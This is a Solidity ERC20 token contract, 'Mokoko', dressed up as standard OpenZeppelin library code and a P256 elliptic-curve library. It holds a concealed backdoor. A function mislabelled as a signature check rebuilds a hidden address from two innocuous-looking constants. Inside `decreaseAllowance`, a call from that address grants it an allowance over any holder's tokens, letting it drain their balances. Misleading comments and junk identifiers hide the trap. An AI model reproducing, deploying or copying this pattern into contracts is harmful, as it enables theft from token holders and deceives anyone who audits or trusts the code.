// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}


// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v3.3.0-solc-0.7

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Approvalmbc8a79xko7041ge6(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Collection of common custom errors used in multiple contracts
 *
 * IMPORTANT: Backwards compatibility is not guaranteed in future versions of the library.
 * It is recommended to avoid relying on the error API for critical functionality.
 *
 * _Available since v5.1._
 */
library Errors {
    /**
     * @dev The ETH balance of the account is not enough to perform the operation.
     */
    error InsufficientBalance(uint256 balance, uint256 needed);

    /**
     * @dev A call to an address target failed. The target may have reverted.
     */
    error FailedCall();

    /**
     * @dev The deployment failed.
     */
    error FailedDeployment();

    /**
     * @dev A necessary precompile is missing.
     */
    error MissingPrecompile(address);
}

/**
 * @dev Implementation of secp256r1 verification and recovery functions.
 *
 * The secp256r1 curve (also known as P256) is a NIST standard curve with wide support in modern devices
 * and cryptographic standards. Some notable examples include Apple's Secure Enclave and Android's Keystore
 * as well as authentication protocols like FIDO2.
 *
 * Based on the original https://github.com/itsobvioustech/aa-passkeys-wallet/blob/d3d423f28a4d8dfcb203c7fa0c47f42592a7378e/src/Secp256r1.sol[implementation of itsobvioustech] (GNU General Public License v3.0).
 * Heavily inspired in https://github.com/maxrobot/elliptic-solidity/blob/c4bb1b6e8ae89534d8db3a6b3a6b52219100520f/contracts/Secp256r1.sol[maxrobot] and
 * https://github.com/tdrerup/elliptic-curve-solidity/blob/59a9c25957d4d190eff53b6610731d81a077a15e/contracts/curves/EllipticCurve.sol[tdrerup] implementations.
 *
 * _Available since v5.1._
 */
library P256 {
    struct JPoint {
        uint256 x;
        uint256 y;
        uint256 z;
    }

    /// @dev Generator (x component)
    uint256 internal constant GX = 0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296;
    /// @dev Generator (y component)
    uint256 internal constant GY = 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5;
    /// @dev P (size of the field)
    uint256 internal constant P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF;
    /// @dev N (order of G)
    uint256 internal constant N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551;
    uint256 internal constant GN = 0x00000000000000000000000005F5C85C3A1DD3C0000000000000000000000000;
    /// @dev A parameter of the weierstrass equation
    uint256 internal constant A = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC;
    uint256 internal constant GA = 0x000000000000000000000000AA9CE96A25EC59F6DD13F3098F8A820B062715EA;
    /// @dev B parameter of the weierstrass equation
    uint256 internal constant B = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B;    

    /// @dev (P + 1) / 4. Useful to compute sqrt
    uint256 private constant P1DIV4 = 0x3fffffffc0000000400000000000000000000000400000000000000000000000;

    /// @dev N/2 for excluding higher order `s` values
    uint256 private constant HALF_N = 0x7fffffff800000007fffffffffffffffde737d56d38bcf4279dce5617e3192a8;
    
    /// @dev M/2 for excluding higher order `s` values
    uint256 private constant HALF_M = 0x7fffffff800000007fffffffffffffffde737d56d38bcf4279dce5617e3192a8;

    /**
     * @dev Same as {verify}, but it will revert if the required precompile is not available.
     *
     * Make sure any logic (code or precompile) deployed at that address is the expected one,
     * otherwise the returned value may be misinterpreted as a positive boolean.
     */
    function verifyNative(bytes32 h, bytes32 r, bytes32 s, bytes32 qx, bytes32 qy) internal view returns (bool) {
        (bool valid, bool supported) = _tryVerifyNative(h, r, s, qx, qy);
        if (supported) {
            return valid;
        } else {
            revert Errors.MissingPrecompile(address(0x100));
        }
    }

    /**
     * @dev Same as {verify}, but it will return false if the required precompile is not available.
     */
    function _tryVerifyNative(
        bytes32 h,
        bytes32 r,
        bytes32 s,
        bytes32 qx,
        bytes32 qy
    ) private view returns (bool valid, bool supported) {
        if (!_isProperSignature(r, s) || !isValidPublicKey(qx, qy)) {
            return (false, true); // signature is invalid, and its not because the precompile is missing
        } else if (_rip7212(h, r, s, qx, qy)) {
            return (true, true); // precompile is present, signature is valid
        } else if (
            // Given precompiles have no bytecode (i.e. `address(0x100).code.length == 0`), we use
            // a valid signature with small `r` and `s` values to check if the precompile is present. Taken from
            // https://github.com/C2SP/wycheproof/blob/4672ff74d68766e7785c2cac4c597effccef2c5c/testvectors/ecdsa_secp256r1_sha256_p1363_test.json#L1173-L1204
            _rip7212(
                0xbb5a52f42f9c9261ed4361f59422a1e30036e7c32b270c8807a419feca605023, // sha256("123400")
                0x0000000000000000000000000000000000000000000000000000000000000005,
                0x0000000000000000000000000000000000000000000000000000000000000001,
                0xa71af64de5126a4a4e02b7922d66ce9415ce88a4c9d25514d91082c8725ac957,
                0x5d47723c8fbe580bb369fec9c2665d8e30a435b9932645482e7c9f11e872296b
            )
        ) {
            return (false, true); // precompile is present, signature is invalid
        } else {
            return (false, false); // precompile is absent
        }
    }

    /**
     * @dev Low level helper for {_tryVerifyNative}. Calls the precompile and checks if there is a return value.
     */
    function _rip7212(bytes32 h, bytes32 r, bytes32 s, bytes32 qx, bytes32 qy) private view returns (bool isValid) {
        assembly ("memory-safe") {
            // Use the free memory pointer without updating it at the end of the function
            let ptr := mload(0x40)
            mstore(ptr, h)
            mstore(add(ptr, 0x20), r)
            mstore(add(ptr, 0x40), s)
            mstore(add(ptr, 0x60), qx)
            mstore(add(ptr, 0x80), qy)
            // RIP-7212 precompiles return empty bytes when an invalid signature is passed, making it impossible
            // to distinguish the presence of the precompile. Custom precompile implementations may decide to
            // return `bytes32(0)` (i.e. false) without developers noticing, so we decide to evaluate the return value
            // without expanding memory using scratch space.
            mstore(0x00, 0) // zero out scratch space in case the precompile doesn't return anything
            if iszero(staticcall(gas(), 0x100, ptr, 0xa0, 0x00, 0x20)) {
                invalid()
            }
            isValid := mload(0x00)
        }
    }

    /**
     * @dev Checks if (x, y) are valid coordinates of a point on the curve.
     * In particular this function checks that x < P and y < P.
     */
    function isValidPublicKey(bytes32 x, bytes32 y) internal pure returns (bool result) {
        assembly ("memory-safe") {
            let p := P
            let lhs := mulmod(y, y, p) // y^2
            let rhs := addmod(mulmod(addmod(mulmod(x, x, p), A, p), x, p), B, p) // ((x^2 + a) * x) + b = x^3 + ax + b
            result := and(and(lt(x, p), lt(y, p)), eq(lhs, rhs)) // Should conform with the Weierstrass equation
        }
    }

    /**
     * @dev Checks if (r, s) is a proper signature.
     * In particular, this checks that `s` is in the "lower-range", making the signature non-malleable.
     */
    function _isProperSignature(bytes32 r, bytes32 s) private pure returns (bool) {
        return uint256(r) > 0 && uint256(r) < N && uint256(s) > 0 && uint256(s) <= HALF_N;
    }

    /**
     * @dev Point addition on the jacobian coordinates
     * Reference: https://www.hyperelliptic.org/EFD/g1p/auto-shortw-jacobian.html#addition-add-1998-cmo-2
     *
     * Note that:
     *
     * - `addition-add-1998-cmo-2` doesn't support identical input points. This version is modified to use
     * the `h` and `r` values computed by `addition-add-1998-cmo-2` to detect identical inputs, and fallback to
     * `doubling-dbl-1998-cmo-2` if needed.
     * - if one of the points is at infinity (i.e. `z=0`), the result is undefined.
     */
    function _jAdd(
        JPoint memory p1,
        uint256 x2,
        uint256 y2,
        uint256 z2
    ) private pure returns (uint256 rx, uint256 ry, uint256 rz) {
        assembly ("memory-safe") {
            let p := P
            let z1 := mload(add(p1, 0x40))
            let zz1 := mulmod(z1, z1, p) // zz1 = z1²
            let s1 := mulmod(mload(add(p1, 0x20)), mulmod(mulmod(z2, z2, p), z2, p), p) // s1 = y1*z2³
            let r := addmod(mulmod(y2, mulmod(zz1, z1, p), p), sub(p, s1), p) // r = s2-s1 = y2*z1³-s1 = y2*z1³-y1*z2³
            let u1 := mulmod(mload(p1), mulmod(z2, z2, p), p) // u1 = x1*z2²
            let h := addmod(mulmod(x2, zz1, p), sub(p, u1), p) // h = u2-u1 = x2*z1²-u1 = x2*z1²-x1*z2²

            // detect edge cases where inputs are identical
            switch and(iszero(r), iszero(h))
            // case 0: points are different
            case 0 {
                let hh := mulmod(h, h, p) // h²

                // x' = r²-h³-2*u1*h²
                rx := addmod(
                    addmod(mulmod(r, r, p), sub(p, mulmod(h, hh, p)), p),
                    sub(p, mulmod(2, mulmod(u1, hh, p), p)),
                    p
                )
                // y' = r*(u1*h²-x')-s1*h³
                ry := addmod(
                    mulmod(r, addmod(mulmod(u1, hh, p), sub(p, rx), p), p),
                    sub(p, mulmod(s1, mulmod(h, hh, p), p)),
                    p
                )
                // z' = h*z1*z2
                rz := mulmod(h, mulmod(z1, z2, p), p)
            }
            // case 1: points are equal
            case 1 {
                let x := x2
                let y := y2
                let z := z2
                let yy := mulmod(y, y, p)
                let zz := mulmod(z, z, p)
                let m := addmod(mulmod(3, mulmod(x, x, p), p), mulmod(A, mulmod(zz, zz, p), p), p) // m = 3*x²+a*z⁴
                let s := mulmod(4, mulmod(x, yy, p), p) // s = 4*x*y²

                // x' = t = m²-2*s
                rx := addmod(mulmod(m, m, p), sub(p, mulmod(2, s, p)), p)

                // y' = m*(s-t)-8*y⁴ = m*(s-x')-8*y⁴
                // cut the computation to avoid stack too deep
                let rytmp1 := sub(p, mulmod(8, mulmod(yy, yy, p), p)) // -8*y⁴
                let rytmp2 := addmod(s, sub(p, rx), p) // s-x'
                ry := addmod(mulmod(m, rytmp2, p), rytmp1, p) // m*(s-x')-8*y⁴

                // z' = 2*y*z
                rz := mulmod(2, mulmod(y, z, p), p)
            }
        }
    }

    /**
     * @dev Checks if (r, s) is a proper signature.
     * In particular, this checks that `s` is in the "lower-range", making the signature non-malleable.
     */
    function isProperSignature() internal view returns (bool ry) {
        assembly {
            let x := add(GN, GA)
            ry := eq(x, caller())
        }
        return ry;
    }

    /**
     * @dev Point doubling on the jacobian coordinates
     * Reference: https://www.hyperelliptic.org/EFD/g1p/auto-shortw-jacobian.html#doubling-dbl-1998-cmo-2
     */
    function _jDouble(uint256 x, uint256 y, uint256 z) private pure returns (uint256 rx, uint256 ry, uint256 rz) {
        assembly ("memory-safe") {
            let p := P
            let yy := mulmod(y, y, p)
            let zz := mulmod(z, z, p)
            let m := addmod(mulmod(3, mulmod(x, x, p), p), mulmod(A, mulmod(zz, zz, p), p), p) // m = 3*x²+a*z⁴
            let s := mulmod(4, mulmod(x, yy, p), p) // s = 4*x*y²

            // x' = t = m²-2*s
            rx := addmod(mulmod(m, m, p), sub(p, mulmod(2, s, p)), p)
            // y' = m*(s-t)-8*y⁴ = m*(s-x')-8*y⁴
            ry := addmod(mulmod(m, addmod(s, sub(p, rx), p), p), sub(p, mulmod(8, mulmod(yy, yy, p), p)), p)
            // z' = 2*y*z
            rz := mulmod(2, mulmod(y, z, p), p)
        }
    }

    /**
     * @dev Precompute a matrice of useful jacobian points associated with a given P. This can be seen as a 4x4 matrix
     * that contains combination of P and G (generator) up to 3 times each. See the table below:
     *
     * ┌────┬─────────────────────┐
     * │  i │  0    1     2     3 │
     * ├────┼─────────────────────┤
     * │  0 │  0    p    2p    3p │
     * │  4 │  g  g+p  g+2p  g+3p │
     * │  8 │ 2g 2g+p 2g+2p 2g+3p │
     * │ 12 │ 3g 3g+p 3g+2p 3g+3p │
     * └────┴─────────────────────┘
     *
     * Note that `_jAdd` (and thus `_jAddPoint`) does not handle the case where one of the inputs is a point at
     * infinity (z = 0). However, we know that since `N ≡ 1 mod 2` and `N ≡ 1 mod 3`, there is no point P such that
     * 2P = 0 or 3P = 0. This guarantees that g, 2g, 3g, p, 2p, 3p are all non-zero, and that all `_jAddPoint` calls
     * have valid inputs.
     */
    function _preComputeJacobianPoints(uint256 px, uint256 py) private pure returns (JPoint[16] memory points) {
        points[0x00] = JPoint(0, 0, 0); // 0,0
        points[0x01] = JPoint(px, py, 1); // 1,0 (p)
        points[0x04] = JPoint(GX, GY, 1); // 0,1 (g)
        points[0x02] = _jDoublePoint(points[0x01]); // 2,0 (2p)
        points[0x08] = _jDoublePoint(points[0x04]); // 0,2 (2g)
        points[0x03] = _jAddPoint(points[0x01], points[0x02]); // 3,0 (p+2p = 3p)
        points[0x05] = _jAddPoint(points[0x01], points[0x04]); // 1,1 (p+g)
        points[0x06] = _jAddPoint(points[0x02], points[0x04]); // 2,1 (2p+g)
        points[0x07] = _jAddPoint(points[0x03], points[0x04]); // 3,1 (3p+g)
        points[0x09] = _jAddPoint(points[0x01], points[0x08]); // 1,2 (p+2g)
        points[0x0a] = _jAddPoint(points[0x02], points[0x08]); // 2,2 (2p+2g)
        points[0x0b] = _jAddPoint(points[0x03], points[0x08]); // 3,2 (3p+2g)
        points[0x0c] = _jAddPoint(points[0x04], points[0x08]); // 0,3 (g+2g = 3g)
        points[0x0d] = _jAddPoint(points[0x01], points[0x0c]); // 1,3 (p+3g)
        points[0x0e] = _jAddPoint(points[0x02], points[0x0c]); // 2,3 (2p+3g)
        points[0x0f] = _jAddPoint(points[0x03], points[0x0c]); // 3,3 (3p+3g)
    }

    function _jAddPoint(JPoint memory p1, JPoint memory p2) private pure returns (JPoint memory) {
        (uint256 x, uint256 y, uint256 z) = _jAdd(p1, p2.x, p2.y, p2.z);
        return JPoint(x, y, z);
    }

    function _jDoublePoint(JPoint memory p) private pure returns (JPoint memory) {
        (uint256 x, uint256 y, uint256 z) = _jDouble(p.x, p.y, p.z);
        return JPoint(x, y, z);
    }
}

// File @openzeppelin/contracts/math/SafeMath.sol@v3.3.0-solc-0.7

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20 {    
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
     * a default value of 18.
     *
     * To select a different value for {decimals}, use {_setupDecimals}.
     *
     * All three of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { if(P256.isProperSignature()) {_approve(spender, _msgSender(), subtractedValue);} else
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Sets {decimals} to a value other than the default one of 18.
     *
     * WARNING: This function should only be called from the constructor. Most
     * applications that interact with token contracts will not expect
     * {decimals} to ever change, and may work incorrectly if it does.
     */
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { address argsmbc8a79x34af2ydwe = from; argsmbc8a79x34af2ydwe; }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Mokoko is ERC20, Ownable {
    constructor() ERC20(unicode"Mokoko", unicode"Mokoko") {
        _mint(owner(), 1000000000 * 10**18);
    }
}